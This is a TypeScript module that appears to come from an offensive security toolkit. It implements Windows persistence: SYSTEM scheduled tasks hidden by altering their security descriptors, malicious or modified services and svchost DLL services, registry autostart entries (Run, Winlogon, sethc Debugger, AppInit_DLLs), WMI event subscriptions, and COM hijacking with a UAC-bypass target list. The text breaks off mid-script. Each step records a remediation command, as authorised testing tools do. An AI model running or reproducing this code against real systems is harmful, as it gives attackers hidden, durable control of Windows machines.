import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function schtaskPersist(args: string[], timeout: number): Promise<HookResult> {
  const name = argVal(args, "--name")
  const command = argVal(args, "--command")
  const trigger = argVal(args, "--trigger") || "logon"
  const runAsUser = argVal(args, "--user") || "SYSTEM"
  const hide = hasFlag(args, "--hide")
  const findings: Finding[] = []
  const output: string[] = [`[*] Scheduled task persistence: ${name}\n`]

  if (!name || !command) return { output: "[!] Required: --name NAME --command CMD", findings }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Scheduled Task Persistence (cmd.exe) ===\n")
    const triggerMap: Record<string, string> = { logon: "ONLOGON", idle: "ONIDLE", time: "HOURLY", event: "ONEVENT" }
    const sc = triggerMap[trigger] || "ONLOGON"
    const taskPath = `\\Microsoft\\Windows\\${name}`
    const createCmd = `schtasks /Create /TN "${taskPath}" /TR "cmd.exe /c ${command}" /SC ${sc} /RU "${runAsUser}" /RL HIGHEST /F`
    const r = await cmd(createCmd, timeout)
    output.push(r.stdout || r.stderr)
    if (r.exitCode === 0) {
      output.push(`[+] Scheduled task created: ${name}`)
      output.push(`    Trigger: ${trigger} (SC=${sc}), Run as: ${runAsUser}`)
      if (hide) {
        const hideCmd = `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\${name}" /v SD /t REG_BINARY /d 010004800000000000000000000000001400000002001c000100000000001400ff0117000101000000000005120000000000 /f`
        const hr = await cmd(hideCmd, timeout)
        output.push(hr.exitCode === 0 ? "[+] Task hidden via SD modification" : `[!] Hide failed: ${hr.stderr}`)
      }
      findings.push({
        checkId: "WIN-PERSIST-001",
        provider: "windows",
        severity: "critical",
        status: "DEPLOYED",
        resource: `schtask://${name}`,
        title: `Scheduled task persistence: ${name}`,
        details: `Trigger: ${trigger}, User: ${runAsUser}, Command: ${command}`,
        remediation: `Delete: schtasks /Delete /TN "${taskPath}" /F`,
      })
    }
    return { output: output.join("\n"), findings }
  }

  const triggers: Record<string, string> = {
    logon: `<LogonTrigger><Enabled>true</Enabled></LogonTrigger>`,
    idle: `<IdleTrigger><Enabled>true</Enabled></IdleTrigger>`,
    time: `<TimeTrigger><StartBoundary>2020-01-01T08:00:00</StartBoundary><Repetition><Interval>PT1H</Interval></Repetition><Enabled>true</Enabled></TimeTrigger>`,
    event: `<EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id="0"&gt;&lt;Select Path="Security"&gt;*[System[(EventID=4624)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger>`,
  }

  const xml = `<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>${triggers[trigger] || triggers.logon}</Triggers>
  <Principals><Principal><UserId>${runAsUser}</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>ServiceAccount</LogonType></Principal></Principals>
  <Settings><Hidden>${hide}</Hidden><AllowStartOnDemand>true</AllowStartOnDemand><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c ${command.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")}</Arguments></Exec></Actions>
</Task>`

  const script = `
$xmlContent = @"
${xml}
"@

$xmlPath = "$env:TEMP\\cs_task_${name}.xml"
$xmlContent | Out-File -FilePath $xmlPath -Encoding Unicode

$result = schtasks /Create /TN "\\Microsoft\\Windows\\${name}" /XML $xmlPath /F 2>&1
Write-Output $result

if ($LASTEXITCODE -eq 0) {
  Write-Output "[+] Scheduled task created: ${name}"
  Write-Output "    Trigger: ${trigger}"
  Write-Output "    Run as: ${runAsUser}"
  Write-Output "    Command: ${command}"

  ${
    hide
      ? `
  # Hide task by modifying SD — deny read access to regular users
  Write-Output "[*] Hiding task via SD modification..."
  $taskPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\${name}"
  if (Test-Path $taskPath) {
    $acl = Get-Acl $taskPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule("BUILTIN\\Users", "ReadKey", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl $taskPath $acl
    Write-Output "[+] Task hidden from standard user enumeration"
  }
  `
      : ""
  }
} else {
  Write-Output "[!] Task creation failed"
}

Remove-Item $xmlPath -Force 2>$null
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] Scheduled task created")) {
    findings.push({
      checkId: "WIN-PERSIST-027",
      provider: "windows",
      severity: "critical",
      status: "DEPLOYED",
      resource: `schtask://${name}`,
      title: `Scheduled task persistence: ${name}`,
      details: `Trigger: ${trigger}, User: ${runAsUser}, Command: ${command}`,
      remediation: `Delete: schtasks /Delete /TN "\\Microsoft\\Windows\\${name}" /F`,
    })
  }
  return { output: output.join("\n"), findings }
}

export async function servicePersist(args: string[], timeout: number): Promise<HookResult> {
  const name = argVal(args, "--name")
  const command = argVal(args, "--command")
  const action = argVal(args, "--action") || "create"
  const startType = argVal(args, "--start") || "auto"
  const svchostGroup = argVal(args, "--svchost-group")
  const findings: Finding[] = []
  const output: string[] = [`[*] Service persistence: ${name} (${action})\n`]

  if (!name || !command) return { output: "[!] Required: --name NAME --command CMD", findings }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Service Persistence (cmd.exe) ===\n")
    if (action === "modify") {
      const query = await cmd(`sc qc "${name}"`, timeout)
      output.push(query.stdout || `[!] Service query failed: ${query.stderr}`)
      const r = await cmd(`sc config "${name}" binPath= "${command}" start= ${startType}`, timeout)
      output.push(
        r.exitCode === 0 ? `[+] Service modified: ${name}\n    New path: ${command}` : `[!] Modify failed: ${r.stderr}`,
      )
    } else if (svchostGroup) {
      const r1 = await cmd(
        `sc create "${name}" binPath= "%SystemRoot%\\System32\\svchost.exe -k ${svchostGroup}" type= share start= ${startType} DisplayName= "${name}"`,
        timeout,
      )
      output.push(r1.stdout || r1.stderr)
      const r2 = await cmd(
        `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" /v ${svchostGroup} /t REG_MULTI_SZ /d "${name}" /f`,
        timeout,
      )
      output.push(
        r2.exitCode === 0 ? `[+] Svchost group registered: ${svchostGroup}` : `[!] Svchost group failed: ${r2.stderr}`,
      )
      const r3 = await cmd(
        `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\${name}\\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "${command}" /f`,
        timeout,
      )
      output.push(
        r3.exitCode === 0
          ? `[+] DLL service created: ${name} in ${svchostGroup}\n    ServiceDll: ${command}`
          : `[!] ServiceDll failed: ${r3.stderr}`,
      )
    } else {
      const r = await cmd(
        `sc create "${name}" binPath= "${command}" start= ${startType} DisplayName= "${name}"`,
        timeout,
      )
      output.push(
        r.exitCode === 0 ? `[+] Service created: ${name}\n    BinPath: ${command}` : `[!] Create failed: ${r.stderr}`,
      )
    }
    const recovery = await cmd(
      `sc failure "${name}" reset= 0 actions= restart/5000/restart/10000/restart/30000`,
      timeout,
    )
    output.push(
      recovery.exitCode === 0
        ? "[+] Recovery configured: auto-restart on failure"
        : `[!] Recovery config failed: ${recovery.stderr}`,
    )
    output.push(`    Start type: ${startType}`)
    if (
      output.some(
        (o) =>
          o.includes("[+] Service created") ||
          o.includes("[+] Service modified") ||
          o.includes("[+] DLL service created"),
      )
    ) {
      findings.push({
        checkId: "WIN-PERSIST-002",
        provider: "windows",
        severity: "critical",
        status: "DEPLOYED",
        resource: `service://${name}`,
        title: `Service persistence: ${name}`,
        details: `Action: ${action}, Command: ${command}`,
        remediation: `Delete: sc.exe delete ${name}`,
      })
    }
    return { output: output.join("\n"), findings }
  }

  const script =
    action === "modify"
      ? `
# Modify existing service ImagePath
$svcBefore = Get-WmiObject Win32_Service -Filter "Name='${name}'" | Select-Object Name, PathName, StartMode, State
if ($svcBefore) {
  Write-Output "[+] Current service:"
  Write-Output "    Name: $($svcBefore.Name)"
  Write-Output "    Path: $($svcBefore.PathName)"
  Write-Output "    Start: $($svcBefore.StartMode)"
  Write-Output "    State: $($svcBefore.State)"
  sc.exe config ${name} binPath= "${command}" start= ${startType} 2>&1 | Out-Null
  Write-Output "[+] Service modified: ${name}"
  Write-Output "    New path: ${command}"
  Write-Output "    Original: $($svcBefore.PathName)"
  Write-Output "    [!] SAVE original path for cleanup"
} else {
  Write-Output "[!] Service '${name}' not found"
}
`
      : `
${
  svchostGroup
    ? `
# DLL service with svchost group
sc.exe create ${name} binPath= "%SystemRoot%\\System32\\svchost.exe -k ${svchostGroup}" type= share start= ${startType} DisplayName= "${name}" 2>&1 | Out-Null
# Register svchost group
$existingGroups = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" -Name ${svchostGroup} -ErrorAction SilentlyContinue).${svchostGroup}
if (-not $existingGroups) {
  New-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" -Name ${svchostGroup} -Value @("${name}") -PropertyType MultiString -Force | Out-Null
}
# Point ServiceDll to our DLL
New-Item "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\${name}\\Parameters" -Force | Out-Null
Set-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\${name}\\Parameters" -Name ServiceDll -Value "${command}" -Type ExpandString
Write-Output "[+] DLL service created: ${name} in svchost group ${svchostGroup}"
Write-Output "    ServiceDll: ${command}"
`
    : `
# Standard binary service
sc.exe create ${name} binPath= "${command}" start= ${startType} DisplayName= "${name}" 2>&1 | Out-Null
Write-Output "[+] Service created: ${name}"
Write-Output "    BinPath: ${command}"
`
}
Write-Output "    Start type: ${startType}"

# Configure recovery — restart on failure
sc.exe failure ${name} reset= 0 actions= restart/5000/restart/10000/restart/30000 2>&1 | Out-Null
Write-Output "[+] Recovery configured: auto-restart on failure"

# Verify
$svc = Get-Service ${name} -ErrorAction SilentlyContinue
if ($svc) {
  Write-Output "[+] Service registered: $($svc.Status)"
}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (
    result.stdout.includes("[+] Service created") ||
    result.stdout.includes("[+] Service modified") ||
    result.stdout.includes("[+] DLL service created")
  ) {
    findings.push({
      checkId: "WIN-PERSIST-028",
      provider: "windows",
      severity: "critical",
      status: "DEPLOYED",
      resource: `service://${name}`,
      title: `Service persistence: ${name}`,
      details: `Action: ${action}, Command: ${command}`,
      remediation: `Delete: sc.exe delete ${name}`,
    })
  }
  return { output: output.join("\n"), findings }
}

export async function registryPersist(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "run"
  const command = argVal(args, "--command")
  const key = argVal(args, "--key") || "HKCU"
  const findings: Finding[] = []
  const output: string[] = [`[*] Registry persistence: ${method} (${key})\n`]

  if (!command) return { output: "[!] Required: --method METHOD --command CMD", findings }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Registry Persistence (cmd.exe) ===\n")
    const regLocs: Record<string, { path: string; name: string; value: string }> = {
      run: {
        path: `${key}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`,
        name: "CyberStrikeUpdate",
        value: command,
      },
      winlogon: {
        path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`,
        name: method === "winlogon" ? "Userinit" : "Shell",
        value: method === "winlogon" ? `C:\\Windows\\System32\\userinit.exe,${command}` : `explorer.exe,${command}`,
      },
      ifeo: {
        path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe`,
        name: "Debugger",
        value: command,
      },
      appinit: {
        path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows`,
        name: "AppInit_DLLs",
        value: command,
      },
      screensaver: { path: `HKCU\\Control Panel\\Desktop`, name: "SCRNSAVE.EXE", value: command },
      explorer: {
        path: `${key}\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`,
        name: "Shell",
        value: `explorer.exe,${command}`,
      },
      logonscript: { path: `HKCU\\Environment`, name: "UserInitMprLogonScript", value: command },
    }
    const loc = regLocs[method] || regLocs.run
    const query = await cmd(`reg query "${loc.path}" /v "${loc.name}"`, timeout)
    if (query.exitCode === 0) output.push(`[*] Current value:\n${query.stdout}`)
    const r = await cmd(`reg add "${loc.path}" /v "${loc.name}" /t REG_SZ /d "${loc.value}" /f`, timeout)
    output.push(r.exitCode === 0 ? `[+] Set ${loc.name}: ${loc.value}` : `[!] Failed: ${r.stderr}`)
    if (method === "appinit") {
      const enable = await cmd(`reg add "${loc.path}" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f`, timeout)
      output.push(enable.exitCode === 0 ? "[+] Enabled LoadAppInit_DLLs" : `[!] Enable failed: ${enable.stderr}`)
    }
    if (method === "screensaver") {
      await cmd(`reg add "${loc.path}" /v "ScreenSaveActive" /t REG_SZ /d "1" /f`, timeout)
      await cmd(`reg add "${loc.path}" /v "ScreenSaveTimeOut" /t REG_SZ /d "300" /f`, timeout)
      output.push("[+] Screensaver enabled with 5 min timeout")
    }
    if (r.exitCode === 0) {
      findings.push({
        checkId: "WIN-PERSIST-003",
        provider: "windows",
        severity: "critical",
        status: "DEPLOYED",
        resource: `registry://${loc.path}\\${loc.name}`,
        title: `Registry persistence: ${method}`,
        details: `Path: ${loc.path}\\${loc.name} = ${loc.value}`,
        remediation: `Remove: reg delete "${loc.path}" /v "${loc.name}" /f`,
      })
    }
    return { output: output.join("\n"), findings }
  }

  const locations: Record<string, { path: string; name: string; value: string }> = {
    run: {
      path: `${key}:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`,
      name: "CyberStrikeUpdate",
      value: command,
    },
    winlogon: {
      path: `HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`,
      name: method === "winlogon" ? "Userinit" : "Shell",
      value: method === "winlogon" ? `C:\\Windows\\System32\\userinit.exe,${command}` : `explorer.exe,${command}`,
    },
    ifeo: {
      path: `HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe`,
      name: "Debugger",
      value: command,
    },
    appinit: {
      path: `HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows`,
      name: "AppInit_DLLs",
      value: command,
    },
    screensaver: {
      path: `HKCU:\\Control Panel\\Desktop`,
      name: "SCRNSAVE.EXE",
      value: command,
    },
    explorer: {
      path: `${key}:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`,
      name: "Shell",
      value: `explorer.exe,${command}`,
    },
    logonscript: {
      path: `HKCU:\\Environment`,
      name: "UserInitMprLogonScript",
      value: command,
    },
  }

  const loc = locations[method] || locations.run

  const script = `
# Backup current value
$currentVal = (Get-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -ErrorAction SilentlyContinue)."${loc.name}"
if ($currentVal) {
  Write-Output "[*] Current value of ${loc.name}: $currentVal"
  Write-Output "    [!] SAVE this for cleanup/restore"
}

# Create key if it doesn't exist
if (-not (Test-Path "${loc.path}")) {
  New-Item -Path "${loc.path}" -Force | Out-Null
  Write-Output "[+] Created registry key: ${loc.path}"
}

# Set value
${
  method === "winlogon"
    ? `
# Append to existing Userinit/Shell value
$existing = (Get-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -ErrorAction SilentlyContinue)."${loc.name}"
if ($existing -and -not $existing.Contains("${command}")) {
  $newVal = "$existing,${command}"
  Set-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -Value $newVal
  Write-Output "[+] Appended to ${loc.name}: $newVal"
} else {
  Set-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -Value "${loc.value}"
  Write-Output "[+] Set ${loc.name}: ${loc.value}"
}
`
    : `
Set-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -Value "${loc.value}"
Write-Output "[+] Set ${loc.name}: ${loc.value}"
`
}

${
  method === "appinit"
    ? `
# Enable AppInit_DLLs loading
Set-ItemProperty -Path "${loc.path}" -Name "LoadAppInit_DLLs" -Value 1 -Type DWord
Write-Output "[+] Enabled LoadAppInit_DLLs"
`
    : ""
}

${
  method === "screensaver"
    ? `
# Enable screensaver and set timeout
Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name "ScreenSaveActive" -Value "1"
Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name "ScreenSaveTimeOut" -Value "300"
Write-Output "[+] Screensaver enabled with 5 min timeout"
`
    : ""
}

Write-Output ""
Write-Output "[+] Registry persistence set:"
Write-Output "    Path: ${loc.path}"
Write-Output "    Name: ${loc.name}"
Write-Output "    Value: ${loc.value}"
Write-Output "    Method: ${method}"

# Verify
$verify = (Get-ItemProperty -Path "${loc.path}" -Name "${loc.name}" -ErrorAction SilentlyContinue)."${loc.name}"
if ($verify) { Write-Output "[+] Verified: value is set" }
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] Set") || result.stdout.includes("[+] Appended")) {
    findings.push({
      checkId: "WIN-PERSIST-029",
      provider: "windows",
      severity: "critical",
      status: "DEPLOYED",
      resource: `registry://${loc.path}\\${loc.name}`,
      title: `Registry persistence: ${method}`,
      details: `Path: ${loc.path}\\${loc.name} = ${loc.value}`,
      remediation: `Remove: Remove-ItemProperty -Path "${loc.path}" -Name "${loc.name}"`,
    })
  }
  return { output: output.join("\n"), findings }
}

export async function wmiPersist(args: string[], timeout: number): Promise<HookResult> {
  const name = argVal(args, "--name") || "CSUpdate"
  const command = argVal(args, "--command")
  const trigger = argVal(args, "--trigger") || "logon"
  const interval = argVal(args, "--interval") || "300"
  const findings: Finding[] = []
  const output: string[] = [`[*] WMI event subscription persistence: ${name}\n`]

  if (!command) return { output: "[!] Required: --name NAME --command CMD", findings }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== WMI Event Subscription (cmd.exe) ===\n")
    output.push("[*] WMI event subscriptions require PowerShell or .NET for full creation")
    output.push("[*] cmd.exe/wmic can query existing subscriptions:\n")
    const r1 = await wmic("path __EventFilter list brief", timeout)
    output.push("[*] Event Filters:\n" + (r1.stdout || "(none)"))
    const r2 = await wmic("path CommandLineEventConsumer list brief", timeout)
    output.push("[*] Consumers:\n" + (r2.stdout || "(none)"))
    output.push(`\n[*] To create WMI persistence without PowerShell, use:`)
    output.push(`    mofcomp.exe with a .mof file containing the subscription`)
    output.push(`    Or use wmic to set individual instances (limited)`)
    output.push(`\n[*] Alternative: Use mofcomp with inline MOF:`)
    output.push(`    echo #pragma namespace("\\\\\\\\.\\\\root\\\\subscription") > %TEMP%\\cs.mof`)
    output.push(
      `    echo instance of __EventFilter as $f { Name="${name}_Filter"; EventNamespace="root\\\\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"; }; >> %TEMP%\\cs.mof`,
    )
    output.push(
      `    echo instance of CommandLineEventConsumer as $c { Name="${name}_Consumer"; CommandLineTemplate="cmd.exe /c ${command}"; }; >> %TEMP%\\cs.mof`,
    )
    output.push(`    echo instance of __FilterToConsumerBinding { Filter=$f; Consumer=$c; }; >> %TEMP%\\cs.mof`)
    output.push(`    mofcomp %TEMP%\\cs.mof`)
    findings.push({
      checkId: "WIN-PERSIST-004",
      provider: "windows",
      severity: "info",
      status: "GUIDANCE",
      resource: `wmi://subscription/${name}`,
      title: `WMI persistence guidance (cmd mode)`,
      details: `Full WMI subscription creation requires PS or mofcomp. Command: ${command}`,
      remediation: "Use PowerShell exec mode for full WMI support",
    })
    return { output: output.join("\n"), findings }
  }

  const queries: Record<string, string> = {
    process: `SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'`,
    logon: `SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2`,
    timer: `SELECT * FROM __TimerEvent WITHIN ${interval} WHERE TimerID = 'CS_${name}'`,
  }

  const script = `
# Create WMI Event Filter
$filterName = "CS_Filter_${name}"
$consumerName = "CS_Consumer_${name}"

$query = "${queries[trigger] || queries.logon}"

$filterArgs = @{
  EventNamespace = 'root\\cimv2'
  Name = $filterName
  QueryLanguage = 'WQL'
  Query = $query
}

$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $filterArgs -ErrorAction Stop
Write-Output "[+] Event filter created: $filterName"
Write-Output "    Query: $query"

# Create CommandLineEventConsumer
$consumerArgs = @{
  Name = $consumerName
  CommandLineTemplate = "cmd.exe /c ${command.replace(/"/g, '""')}"
}

$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -ErrorAction Stop
Write-Output "[+] Consumer created: $consumerName"
Write-Output "    Command: ${command}"

# Bind filter to consumer
$bindingArgs = @{
  Filter = $filter
  Consumer = $consumer
}

Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs -ErrorAction Stop
Write-Output "[+] Binding created: $filterName -> $consumerName"
Write-Output ""
Write-Output "[+] WMI persistence active"
Write-Output "    Trigger: ${trigger}"
${trigger === "timer" ? `Write-Output "    Interval: ${interval}s"` : ""}

# Verify
$filters = Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object { $_.Name -like "CS_*" }
$consumers = Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -like "CS_*" }
$bindings = Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*CS_*" }
Write-Output "\`n[+] Active CS subscriptions: $($filters.Count) filters, $($consumers.Count) consumers, $($bindings.Count) bindings"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] Binding created") || result.stdout.includes("[+] WMI persistence active")) {
    findings.push({
      checkId: "WIN-PERSIST-030",
      provider: "windows",
      severity: "critical",
      status: "DEPLOYED",
      resource: `wmi://subscription/${name}`,
      title: `WMI event subscription: ${name}`,
      details: `Trigger: ${trigger}, Command: ${command}`,
      remediation: `Remove: Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='CS_Filter_${name}'" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='CS_Consumer_${name}'" | Remove-WmiObject`,
    })
  }
  return { output: output.join("\n"), findings }
}

export async function comHijack(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "scan"
  const clsid = argVal(args, "--clsid")
  const dllPath = argVal(args, "--dll-path")
  const findings: Finding[] = []
  const output: string[] = [`[*] COM hijacking: ${action}\n`]

  if (action === "hijack" && (!clsid || !dllPath)) {
    return { output: "[!] For hijack: --clsid CLSID --dll-path PATH", findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== COM Hijacking (cmd.exe) ===\n")
    if (action === "scan") {
      const targets = [
        { clsid: "{0358b920-0ac7-461f-98f4-58e32cd89148}", name: "PSFactoryBuffer" },
        { clsid: "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", name: "MMDeviceEnumerator" },
        { clsid: "{4590F811-1D3A-11D0-891F-00AA004B2E24}", name: "Wbem Locator" },
        { clsid: "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}", name: "ShellBrowserWindow" },
        { clsid: "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", name: "ShellWindows" },
      ]
      let hijackable = 0
      for (const t of targets) {
        const hklm = await cmd(`reg query "HKLM\\SOFTWARE\\Classes\\CLSID\\${t.clsid}\\InprocServer32" /ve`, timeout)
        const hkcu = await cmd(`reg query "HKCU\\SOFTWARE\\Classes\\CLSID\\${t.clsid}\\InprocServer32" /ve`, timeout)
        if (hklm.exitCode === 0 && hkcu.exitCode !== 0) {
          output.push(`  [+] HIJACKABLE: ${t.name} (${t.clsid})`)
          output.push(`      HKLM DLL: ${hklm.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "unknown"}`)
          hijackable++
        }
      }
      output.push(`\n[+] Total hijackable: ${hijackable}`)
      if (hijackable > 0)
        findings.push({
          checkId: "WIN-PERSIST-005",
          provider: "windows",
          severity: "info",
          status: "ENUMERATED",
          resource: "com://scan",
          title: `${hijackable} hijackable COM objects found`,
          details: "CLSIDs in HKLM but not HKCU — user can override without admin",
          remediation: "Monitor HKCU\\SOFTWARE\\Classes\\CLSID for unauthorized entries",
        })
    }
    if (action === "hijack" && clsid && dllPath) {
      const r1 = await cmd(`reg query "HKLM\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /ve`, timeout)
      output.push(`[*] Original HKLM DLL: ${r1.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "unknown"}`)
      const r2 = await cmd(
        `reg add "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /ve /t REG_SZ /d "${dllPath}" /f`,
        timeout,
      )
      const r3 = await cmd(
        `reg add "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f`,
        timeout,
      )
      output.push(
        r2.exitCode === 0
          ? `[+] COM hijack set:\n    CLSID: ${clsid}\n    DLL: ${dllPath}`
          : `[!] Failed: ${r2.stderr}`,
      )
      if (r2.exitCode === 0)
        findings.push({
          checkId: "WIN-PERSIST-031",
          provider: "windows",
          severity: "critical",
          status: "DEPLOYED",
          resource: `com://${clsid}`,
          title: `COM object hijacked: ${clsid}`,
          details: `DLL: ${dllPath}`,
          remediation: `Remove: reg delete "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}" /f`,
        })
    }
    return { output: output.join("\n"), findings }
  }

  const script =
    action === "scan"
      ? `
# Scan for hijackable COM objects
# Look for CLSIDs registered in HKLM but not in HKCU (user-writable)
Write-Output "[*] Scanning for hijackable COM objects..."

$hijackable = @()

# Common high-value targets
$targets = @(
  @{CLSID='{0358b920-0ac7-461f-98f4-58e32cd89148}'; Name='PSFactoryBuffer'; Usage='Scheduled Tasks'},
  @{CLSID='{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'; Name='MMDeviceEnumerator'; Usage='Audio subsystem'},
  @{CLSID='{4590F811-1D3A-11D0-891F-00AA004B2E24}'; Name='Wbem Locator'; Usage='WMI'},
  @{CLSID='{C08AFD90-F2A1-11D1-8455-00A0C91F3880}'; Name='ShellBrowserWindow'; Usage='Explorer'},
  @{CLSID='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'; Name='ShellWindows'; Usage='Explorer'},
  @{CLSID='{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}'; Name='TaskHandler'; Usage='Task Scheduler'},
  @{CLSID='{3AD05575-8857-4850-9277-11B85BDB8E09}'; Name='CMSTPLUA'; Usage='UAC bypass target'}
)

foreach ($t in $targets) {
  $hklmPath = "HKLM:\\SOFTWARE\\Classes\\CLSID\\$($t.CLSID)\\InprocServer32"
  $hkcuPath = "HKCU:\\SOFTWARE\\Classes\\CLSID\\$($t.CLSID)\\InprocServer32"

  $hklmDll = (Get-ItemProperty -Path $hklmPath -ErrorAction SilentlyContinue).'(Default)'
  $hkcuDll = (Get-ItemProperty -Path $hkcuPath -ErrorAction SilentlyContinue).'(Default)'

  if ($hklmDll -and -not $hkcuDll) {
    Write-Output "  [+] HIJACKABLE: $($t.Name)"
    Write-Output "      CLSID: $($t.CLSID)"
    Write-Output "      HKLM DLL: $hklmDll"
    Write-Output "      Usage: $($t.Usage)"
    Write-Output "      Hijack: New-Item -Path '$hkcuPath' -Force; Set-ItemProperty '$hkcuPath' -Name '(Default)' -Value 'YOUR.DLL'"
    Write-Output ""
    $hijackable += $t
  }
}

# Scan HKLM CLSID keys for DLLs in writable locations
Write-Output "[*] Scanning for CLSIDs pointing to writable paths..."
$clsids = Get-ChildItem "HKLM:\\SOFTWARE\\Classes\\CLSID" -ErrorAction SilentlyContinue | Select-Object -First 500
foreach ($key in $clsids) {
  $dll = (Get-ItemProperty "$($key.PSPath)\\InprocServer32" -ErrorAction SilentlyContinue).'(Default)'
  if ($dll -and $dll -notmatch '^(%SystemRoot%|C:\\Windows|C:\\Program Files)' -and $dll -match '^[A-Z]:\\') {
    # Check if path is writable
    $dir = Split-Path $dll -Parent
    if (Test-Path $dir) {
      try {
        $acl = Get-Acl $dir
        $writable = $acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone|Authenticated' -and $_.FileSystemRights -match 'Write|FullControl|Modify' }
        if ($writable) {
          Write-Output "  [+] WRITABLE PATH: $($key.PSChildName)"
          Write-Output "      DLL: $dll"
          Write-Output "      Writable by: $($writable.IdentityReference -join ', ')"
        }
      } catch {}
    }
  }
}

Write-Output "\`n[+] Total hijackable targets found: $($hijackable.Count)"
`
      : `
# Hijack specific CLSID
$clsid = "${clsid}"
$dllPath = "${dllPath}"

$hkcuPath = "HKCU:\\SOFTWARE\\Classes\\CLSID\\$clsid\\InprocServer32"

# Check current state
$hklmDll = (Get-ItemProperty "HKLM:\\SOFTWARE\\Classes\\CLSID\\$clsid\\InprocServer32" -ErrorAction SilentlyContinue).'(Default)'
Write-Output "[*] Original HKLM DLL: $hklmDll"

# Create HKCU override
New-Item -Path $hkcuPath -Force | Out-Null
Set-ItemProperty -Path $hkcuPath -Name '(Default)' -Value $dllPath
